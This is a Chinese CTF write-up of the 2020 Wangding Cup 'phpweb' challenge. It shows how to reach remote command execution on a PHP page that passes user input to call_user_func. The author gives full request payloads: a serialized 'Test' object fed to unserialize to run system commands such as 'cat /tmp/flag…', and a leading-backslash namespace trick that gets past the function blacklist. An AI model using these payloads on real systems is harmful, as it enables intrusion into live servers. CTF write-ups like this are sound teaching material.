[网鼎杯 2020 朱雀组]phpweb

考点：文件包含读取源码、反序列化（或命名空间

抓包看到func=date&p=Y-m-d+h%3Ai%3As+a可以联想到call_user_func，因此尝试了一些常见的system、exec、phpinfo、eval函数发现被ban了。于是拿show_source、highlight_file、readfile尝试读一下文件，读到以下源码

php

解法一：

发现$func在执行前被小写操作和过滤了很多函数，并且发现有一个Test可以构造

于是想到可以将$func传参为unserialize、将$p传参为序列化后的Test类，利用析构函数来进行命令执行

于是在本地构造：

php

func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}发送参数后得到根目录文件，没有发现flag文件，于是构造func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}来找到flag位置/tmp/flagoefiu4r93

于是O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}读取flag内容

解法二：

命名空间绕过黑名单（这个其实我也不太懂）

1.func=\system&p=find / -name flag*、func=\system&p=cat /tmp/flagoefiu4r93

2.func=\exec&p=find / -name flag* 、func=\exec&p=cat /tmp/flagoefiu4r93(这个每次回显只有一个变量)
